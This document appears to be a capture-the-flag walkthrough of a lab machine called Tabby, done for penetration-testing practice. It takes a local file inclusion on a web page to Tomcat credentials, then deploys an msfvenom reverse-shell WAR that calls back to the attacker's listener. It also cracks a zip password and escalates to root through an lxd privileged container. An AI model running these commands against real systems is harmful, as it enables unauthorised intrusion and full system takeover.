# Tabby

## Basic Information

|          |  |
| :---                 |     :---:      |
| Machine Name         | Tabby     |
| Written by           | Adir Biran       |
| IP Address           | 10.10.10.194       |
| Tools and Techniques | Nmap, Gobuster, msfvenom, zip2john, john, lxd, Local File Inclusion      |

## Method

Enumerating the various services on the machine and gaining credentials with LFI attack.  
Escalating the privileges once by password cracking a protected zip file and second time by exploiting lxd group. 

## Enumeration


#### Nmap
<p align="center">
<img width="384" alt="1" src="https://user-images.githubusercontent.com/21021400/144756218-27772840-95f1-417c-8ba5-bcf4d68e15a2.png">
</p>

Open Ports:  
22 - SSH  
80 - HTTP  
8080 - HTTP  

#### Gobuster

Gobuster - Port 80  
<p align="center">
<img width="330" alt="2" src="https://user-images.githubusercontent.com/21021400/144756220-db1ddda8-e279-46a1-a8f0-154c201bf21a.png">
</p>

Endpoints found:  
/assets - unreachable  
/files - unreachable  

Gobuster - Port 8080  
<p align="center">
<img width="344" alt="3" src="https://user-images.githubusercontent.com/21021400/144756221-b595a718-a438-4714-99f9-9faec7c84dcf.png">
</p>

Endpoints found:  
/docs  
/examples  
/host-manager  
/manager  

#### Manual Enumeration

The website - Port 80  
<p align="center">
<img width="960" alt="4" src="https://user-images.githubusercontent.com/21021400/144756222-89636078-578a-4f9f-9f6d-8b0a21928e08.png">
</p>

Navigated the website for a while and checked robots.txt, nothing useful so far.  

The website - Port 8080  
<p align="center">
<img width="960" alt="4-0" src="https://user-images.githubusercontent.com/21021400/144756223-e58c632e-e6b8-45a8-8907-502dbbbf4574.png">
</p>

From the last line, we can see users file is located at /etc/tomcat9/tomcat-users.xml  


/docs  
<p align="center">
<img width="959" alt="4-1" src="https://user-images.githubusercontent.com/21021400/144756224-f253a727-0ea8-4107-a0fd-2a4ccd7454c3.png">
</p>

Documentation of the apache tomcat, version is 9.0.31.  

/examples  
<p align="center">
<img width="279" alt="4-2" src="https://user-images.githubusercontent.com/21021400/144756225-f4d3bb25-cf70-4f33-ad1b-0b8422e225e3.png">
</p>

Examples of the apache tomcat.  

/host-manager  
<p align="center">
<img width="804" alt="4-3" src="https://user-images.githubusercontent.com/21021400/144756226-117382a1-5855-48eb-8d12-36fa844dd4df.png">
</p>

This page requires a login, tried different default credentials found on google but nothing worked.  
Another line here, indicating the tomcat users file is located in conf/tomcat-users.xml  

/manager  
<p align="center">
<img width="814" alt="4-4" src="https://user-images.githubusercontent.com/21021400/144756227-73931998-63a5-4c4d-a442-e376fa600511.png">
</p>

Same as host-manager.  

Continuing on the website on port 80.  

Added megahosting to /etc/hosts file  
<p align="center">
<img width="136" alt="6" src="https://user-images.githubusercontent.com/21021400/144756229-3fbd00de-8c4b-4c0a-8c86-fd17ded9a43b.png">
</p>

The news button leads to something interesting:  
<p align="center">
<img width="960" alt="5" src="https://user-images.githubusercontent.com/21021400/144756228-501ce6e6-18e7-484c-933e-0c9853fb197e.png">
</p>

## Exploitation

#### LFI - Local File Inclusion

Tried basic LFI, but failed.  
<p align="center">
<img width="371" alt="7" src="https://user-images.githubusercontent.com/21021400/144756230-f487e5ec-b9e6-4cb0-b33f-0ea9c67dd799.png">
</p>

Using relative path works.  
<p align="center">
<img width="960" alt="8" src="https://user-images.githubusercontent.com/21021400/144756232-a15fd7d0-d927-44cd-aa7a-e675a62faf23.png">
</p>

User found: ash  

Let's try to read the credentials for the tomcat's host-manager/manager.  
As we saw earlier, the users file is supposed to be located at /etc/tomcat9/tomcat-users.xml.  
<p align="center">
<img width="455" alt="9" src="https://user-images.githubusercontent.com/21021400/144756233-8c473414-38d3-4491-814a-03f949a701b1.png">
</p>

However, seems the file has been moved.  
After failed trials, installed the tomcat9 locally using:  
```
sudo apt-get install tomcat9  
```

And located the tomcat-users.xml file:  
```
find / -name tomcat-users.xml 2>/dev/null  
```
<p align="center">
<img width="190" alt="10" src="https://user-images.githubusercontent.com/21021400/144756234-17323cbb-b47e-47a8-ad5e-c6bc1749c879.png">
</p>

The second path we tried already, lets try the first one:  
/usr/share/tomcat9/etc/tomcat-users.xml  
View source to see the content of the xml file.  
<p align="center">
<img width="528" alt="11" src="https://user-images.githubusercontent.com/21021400/144756235-a7dd7fd3-2ca7-4c6c-ac81-cdead561dd16.png">
</p>

Credentials found:  
tomcat:$3cureP4s5w0rd123!  
Roles: admin-gui, manager-script  

Trying to get to megahosting.htb:8080/manager and /host-manager with the credentials found.  
/manager failed  
/host-manager succeed  
<p align="center">
<img width="960" alt="12" src="https://user-images.githubusercontent.com/21021400/144756236-f98abcdd-dafe-47fd-ae64-2c45e4d0e2bd.png">
</p>

After researching google for a while, found multiple ways to exploit the /manager app but not the /host-manager one.  
However, the tomcat user has 2 roles: admin-gui and manager-script.  

From the host-manager failed login page, we can see the manager-script role allows for text interface.  
Meaning, we can try to upload a reverse shell using the text interface.  

More information on the roles can be found here:  
https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html  
<p align="center">
<img width="402" alt="13" src="https://user-images.githubusercontent.com/21021400/144756237-0a62b43e-3298-4050-80f7-523e6ec665a1.png">
</p>

From the tomcat documentation found on google, we can see how to use the text interface:  
https://tomcat.apache.org/tomcat-8.5-doc/host-manager-howto.html  

All we need is curl the url: http://10.10.10.194:8080/host-manager/text/{command} with the username and password as mentioned in the documentation.  
Trying the basic list command from the documentation:  
```
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/host-manager/text/list  
```
<p align="center">
<img width="367" alt="14" src="https://user-images.githubusercontent.com/21021400/144756238-374c2fac-5d5b-4f50-b9ba-d09f556e1f79.png">
</p>

The host-manager doesn't work, but the /manager does.  
<p align="center">
<img width="334" alt="15" src="https://user-images.githubusercontent.com/21021400/144756239-6636d2f0-6a8e-43f7-916f-add560f54fb0.png">
</p>

Good.  
The next thing is to upload a reverse shell using the command line.  

First, let's create the payload as a war file to be deployed by the apache server.  
```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f war -o shell.war  
```
<p align="center">
<img width="352" alt="16" src="https://user-images.githubusercontent.com/21021400/144756240-3ef4913a-f59c-4235-a17a-22ae10867480.png">
</p>

As explained in this documentation, we'll use this method to deploy the war file remotely.  
https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely  
<p align="center">
<img width="768" alt="17" src="https://user-images.githubusercontent.com/21021400/144756241-64cea9dc-f95e-4477-8514-ee309518db22.png">
</p>

Deploying the war remotely:  
```
curl -u 'tomcat:$3cureP4s5w0rd123!' -T shell.war http://10.10.10.194:8080/manager/text/deploy?path=/shell  
```
<p align="center">
<img width="444" alt="18" src="https://user-images.githubusercontent.com/21021400/144756242-6200c61c-2bc4-4ae6-8244-17d5ff2aa887.png">
</p>

Now let's open nc on port 1234 and navigate to 10.10.10.194:8080/shell.  
<p align="center">
<img width="241" alt="19" src="https://user-images.githubusercontent.com/21021400/144756243-ac3fe287-34eb-4896-8d29-1536505a3d8e.png">
</p>

And we're in as tomcat.

## Privilege Escalation (tomcat -> ash)

Tried to enumerate manually to find ways to escalate privileges before trying linpeas.  

sudo -l fails, we don't know the password for tomcat user.  

SUID files also didn't induce something useful, as well as the user's groups.  

Decided to try the /var/www/html directory, as we had earlier paths we couldn't reach (/assets, /files).  
<p align="center">
<img width="220" alt="20" src="https://user-images.githubusercontent.com/21021400/144756244-ae4284e9-a848-4baf-a825-a902d311ad7d.png">
</p>


/assets has nothing useful, but /files directory does.  
<p align="center">
<img width="248" alt="21" src="https://user-images.githubusercontent.com/21021400/144756245-8be4b377-8445-4368-bf16-5850f9ebb09c.png">
</p>

As the zip file is password protected, we will copy it to our machine and try to crack the password.  
<p align="center">
<img width="950" alt="22" src="https://user-images.githubusercontent.com/21021400/144756247-32cbb664-fb3f-4bf6-889f-2dfc7e20a00c.png">
</p>

Used zip2john to form the hash:  
<p align="center">
<img width="474" alt="23" src="https://user-images.githubusercontent.com/21021400/144756248-2333c636-9063-4386-8a8f-ceea25ab048b.png">
</p>

And john to crack the password:  
<p align="center">
<img width="380" alt="24" src="https://user-images.githubusercontent.com/21021400/144756249-95664ca1-24b8-4a16-9d1e-86557c1ea686.png">
</p>

Password found: admin@it  

Trying SSH ash with that password failed as it requires the private key.  
<p align="center">
<img width="197" alt="25" src="https://user-images.githubusercontent.com/21021400/144756250-49c6db16-e8e2-4d16-955a-97e22217f337.png">
</p>

Let's try within the reverse shell to switch user to ash with that password.  
<p align="center">
<img width="164" alt="26" src="https://user-images.githubusercontent.com/21021400/144756251-36b430b8-288d-49e7-8f5b-0e2d56fe6495.png">
</p>

## Privilege Escalation (ash -> root)

Chekcing sudo permission  
<p align="center">
<img width="249" alt="27" src="https://user-images.githubusercontent.com/21021400/144756252-6951cabd-3b44-42d7-96b7-9e46b7070fdd.png">
</p>

ash's groups  
<p align="center">
<img width="367" alt="28" src="https://user-images.githubusercontent.com/21021400/144756253-ce4de5d1-5607-4f5d-8ddc-12a5983092bd.png">
</p>

As we can see, ash is in lxd group and this is known to be a privilege escalation vector.  

Following the method mentioned in this article:  
https://www.hackingarticles.in/lxd-privilege-escalation/  

On the local machine:
```
git clone  https://github.com/saghul/lxd-alpine-builder.git  
```
<p align="center">
<img width="264" alt="29" src="https://user-images.githubusercontent.com/21021400/144756254-ddfa9efa-eecf-4c08-8c88-1890c6d2366d.png">
</p>

```
cd lxd-alpine-builder  
./build-alpine  
```

<p align="center">
<img width="183" alt="30" src="https://user-images.githubusercontent.com/21021400/144756256-39066620-706a-425e-ac0a-420a34a3db3a.png">
</p>

When building is finished, an alpine file will be created.  
<p align="center">
<img width="339" alt="31" src="https://user-images.githubusercontent.com/21021400/144756257-319d81f7-6095-4881-8105-3f6302bdea74.png">
</p>

Moved the alpine file to the remote machine's /tmp directory using python simple server.  
<p align="center">
<img width="793" alt="32" src="https://user-images.githubusercontent.com/21021400/144756258-7e0399ae-2718-4fa8-8c94-c5abb5c6c701.png">
</p>

However, the process won't work on the /tmp directory due to lack of permissions.  
So we will move the alpine.tar.gz file to the /home/ash directory and continue the execution from there.  
<p align="center">
<img width="173" alt="33" src="https://user-images.githubusercontent.com/21021400/144756259-7bfa7766-84de-4a29-aac1-b07d4936362a.png">
</p>

First, initiate the lxd service:  
```
lxd init  
```
<p align="center">
<img width="411" alt="34" src="https://user-images.githubusercontent.com/21021400/144756260-7c2c9acb-953c-4775-96f5-9e6d96994684.png">
</p>

As we can see, lxd wasn't found because /snap/bin isn't in our path, let's add it.  
```
export PATH=/snap/bin:$PATH  
lxd init  
```
<p align="center">
<img width="426" alt="35" src="https://user-images.githubusercontent.com/21021400/144756261-4aa1719a-90a7-4236-8c42-7d13eeadc265.png">
</p>

Import the image  
```
lxc image import ./alpine.tar.gz --alias img  
```
<p align="center">
<img width="249" alt="36" src="https://user-images.githubusercontent.com/21021400/144756262-65773314-7d05-497b-9204-3128ba829713.png">
</p>

Make sure the image was imported  
```
lxc image list  
```
<p align="center">
<img width="531" alt="37" src="https://user-images.githubusercontent.com/21021400/144756264-559d7f55-aaa1-40e2-a2dd-2bbfcd931dd6.png">
</p>

Set security privileges  
```
lxc init img ignite -c security.privileged=true  
```
<p align="center">
<img width="246" alt="38" src="https://user-images.githubusercontent.com/21021400/144756267-7abe330d-b32f-46cd-9a0b-a1e178be1f10.png">
</p>

Mount the image  
```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
```
<p align="center">
<img width="382" alt="39" src="https://user-images.githubusercontent.com/21021400/144756268-07fe8dc1-a2d0-4311-8243-4a639d59ad90.png">
</p>

Start the image  
```
lxc start ignite  
```
<p align="center">
<img width="129" alt="40" src="https://user-images.githubusercontent.com/21021400/144756270-aa9e0138-c42e-4ca2-9b93-361400b93c4d.png">
</p>

Execute root shell  
```
lxc exec ignite /bin/sh  
```
<p align="center">
<img width="150" alt="41" src="https://user-images.githubusercontent.com/21021400/144756271-5b0d8aa2-f986-42c7-a2fe-f31b946e8b58.png">
</p>

Some characters are messed up, but root is a root.  
<p align="center">
<img width="155" alt="42" src="https://user-images.githubusercontent.com/21021400/144756272-a0e75a47-d95a-43be-a776-94eec2655099.png">
</p>

The mounted image is located in /mnt/root.  
<p align="center">
<img width="261" alt="43" src="https://user-images.githubusercontent.com/21021400/144756273-983d41f7-9a60-4271-9308-f5b14ac59d22.png">
</p>
